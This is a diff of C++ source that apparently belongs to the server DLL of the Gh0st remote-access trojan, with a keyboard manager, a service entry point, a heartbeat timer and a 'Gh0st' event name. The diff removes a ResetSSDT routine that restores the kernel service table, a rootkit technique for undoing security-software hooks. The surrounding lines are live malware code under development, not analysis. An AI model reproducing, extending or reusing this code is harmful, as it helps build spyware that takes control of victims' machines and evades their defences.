@@ -8,7 +8,6 @@
 #include "common/login.h"
 #include "common/install.h"
 #include "common/until.h"
-#include "common/resetssdt.h"
 //#include "common/hidelibrary.h"
 enum
 {
@@ -21,7 +20,6 @@ enum
 #define		HEART_BEAT_TIME		1000 * 60 * 3 // 心跳时间
 
 extern "C" __declspec(dllexport) void ServiceMain(int argc, wchar_t* argv[]);
-extern "C" __declspec(dllexport) bool ResetSSDT();
 
 int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress );
 void __stdcall ServiceHandler(DWORD dwControl);
@@ -80,7 +78,6 @@ DWORD WINAPI main(char *lpServiceName)
 	if (CKeyboardManager::g_hInstance != NULL)
 	{
 		SetUnhandledExceptionFilter(bad_exception);
-		ResetSSDT();
 		
 		lstrcpy(strServiceName, lpServiceName);
 		wsprintf(strKillEvent, "Global\\Gh0st %d", GetTickCount()); // 随机事件名
@@ -219,10 +216,6 @@ BOOL APIENTRY DllMain( HANDLE hModule,
     return TRUE;
 }
 
-extern "C" __declspec(dllexport) bool ResetSSDT()
-{
-	return RestoreSSDT(CKeyboardManager::g_hInstance);
-}
 
 extern "C" __declspec(dllexport) void ServiceMain( int argc, wchar_t* argv[] )
 {
